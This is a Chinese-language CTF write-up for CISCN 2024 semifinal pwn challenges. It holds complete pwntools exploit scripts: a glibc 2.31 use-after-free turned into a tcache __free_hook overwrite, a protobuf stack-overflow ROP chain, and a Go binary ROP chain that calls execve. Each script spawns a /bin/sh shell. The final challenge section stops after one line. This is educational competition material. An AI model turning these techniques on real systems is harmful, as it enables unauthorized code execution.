---
title: ciscn2024华中地区半决赛-Pwn-wp
date: 2024-06-26 23:51:25
category: wp
tags:
---

# pwn
## note
### 分析
很简单的堆题，题目libc版本是glibc-2.31，对应ubuntu-20.04版本

这个版本tcache没有加入PROTECT_PTR保护fd指针(glibc-2.32加入)，所以就不用泄露heap_base了
但要注意tcache的count，glibc-2.30之前一直是检测fd指针是否为空指针来判断tcache堆块是否有剩余，glibc-2.30及以后改为使用count

题目是个笔记管理系统，delete函数有UAF

### 思路
1. 利用unsortedbin的bk指针泄露libc_base
2. 然后直接利用tcache打free_hook

### exp
```python
from pwn import *

p = process("./pwn")
libc = ELF("./libc.so.6")
elf = ELF("./pwn")

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'

def create(size,content):
    p.recvuntil(b'5. exit\n')
    p.sendline(b'1')
    p.recvuntil(b'The size of your content: \n')
    p.sendline(str(size).encode())
    p.recvuntil(b'content: \n')
    p.send(content)

def edit(index,size,content):
    p.recvuntil(b'5. exit\n')
    p.sendline(b'2')
    p.recvuntil(b'index: \n')
    p.sendline(str(index).encode())
    p.recvuntil(b'The size of your content: \n')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: \n')
    p.send(content)

def delete(index):
    p.recvuntil(b'5. exit\n')
    p.sendline(b'3')
    p.recvuntil(b'index: \n')
    p.sendline(str(index).encode()) 

def show(index):
    p.recvuntil(b'5. exit\n')
    p.sendline(b'4')
    p.recvuntil(b'index: \n')
    p.sendline(str(index).encode())
 
def exit():
    p.recvuntil(b'5. exit\n')
    p.sendline(b'5')

# leak libc_base
create(0x450,b'bbbb')
create(0x10,b'cccc')
delete(0)
show(0)
p.recvuntil(b'Content: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 0x1ecbe0
log.success('libc_base ==> ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

create(0x20,b'dddd')
create(0x20,b'dddd')
delete(3)
delete(2)
edit(2,8,p64(free_hook))
create(0x20,p64(free_hook))
create(0x20,p64(system))

create(0x30,b'/bin/sh\x00')
delete(6)

p.interactive()

```

## protoverflow
### 分析
protobuf我在初赛的wp中讲过了，这次就跳过了

这是还原出的结构体
```
syntax = "proto2";

message protoMessage {
    optional string name = 1;
    optional string phoneNumber = 2;
    required bytes buffer = 3;
    required uint32 size = 4;
}
```

后面就是很简单的栈溢出

### exp
```python
from pwn import *
import message_pb2

p  = process('./pwn')

#libc = ELF("./libc-2.27.so")
libc = ELF("/usr/lib/libc.so.6")
elf = ELF("./pwn")


context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

message = message_pb2.protoMessage()

p.recvuntil(b'Gift: ')
puts = int(p.recv(),16)
libc_base = puts - 0x07f7d0
log.success('libc_base ==> ' + hex(libc_base))

pop_rdi = libc_base + 0xfd8c4 # 0x00000000000fd8c4 : pop rdi ; ret
binsh = libc_base + 0x1aae28 # 0x00000000001aae28 : /bin/sh
system = libc_base + libc.sym['system']
ret = libc_base + 0xfd8c5

message.size = 0x500
message.buffer = cyclic(536) + p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)
data = message.SerializeToString()

#gdb.attach(p)

p.send(data)

p.interactive()
```

## go_note
### 分析
edit函数可以无限溢出，主要是利用edit函数中调用的memcpy函数
不想看go逆出来的一堆代码，直接用系统调用

### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

elf = ELF("./note")
p = process("./note")

pop_rax_rbp = 0x404408 #0x0000000000404408 : pop rax ; pop rbp ; ret
pop_rbx = 0x404541 #0x0000000000404541 : pop rbx ; ret
mov_rcx_0 = 0x40318e #0x000000000040318e : mov rcx, 0 ; ret
pop_rdx = 0x47a8fa #0x000000000047a8fa : pop rdx ; ret
xor_rdi = 0x411aee #0x0000000000411aee : xor edi, edi ; add rsp, 0x10 ; pop rbp ; ret
mov_mrax_edx = 0x402fd1 #0x0000000000402fd1 : mov dword ptr [rax], edx ; ret
ret = 0x47f6ea 
go_syscall = 0x403160

addr = 0x520000 

payload  = b'a'*64
payload += p64(pop_rax_rbp) + p64(addr) + p64(0) + p64(pop_rdx) + b'/bin' + b'\x00'*4 + p64(mov_mrax_edx) 
payload += p64(pop_rax_rbp) + p64(addr+0x4) + p64(0) + p64(pop_rdx) + b'/sh\x00' + b'\x00'*4 + p64(mov_mrax_edx)
#payload += p64(ret)
payload += p64(pop_rax_rbp) + p64(0x3b) + p64(0)+ p64(pop_rbx) + p64(addr) + p64(mov_rcx_0) + p64(xor_rdi) + p64(0)*3 + p64(go_syscall)

p.recvuntil(b'choice > ')
p.sendline(b'1')
p.recvuntil(b'content: ')
p.sendline(b'aaaa')
p.recvuntil(b'choice > ')
p.sendline(b'3')
p.recvuntil(b'id: ')
p.sendline(b'1')
p.recvuntil(b'content: ')

#gdb.attach(p)

p.sendline(payload)

p.interactive()
```

## starlink
### 分析
glibc-2.35，对应ubuntu-22.04

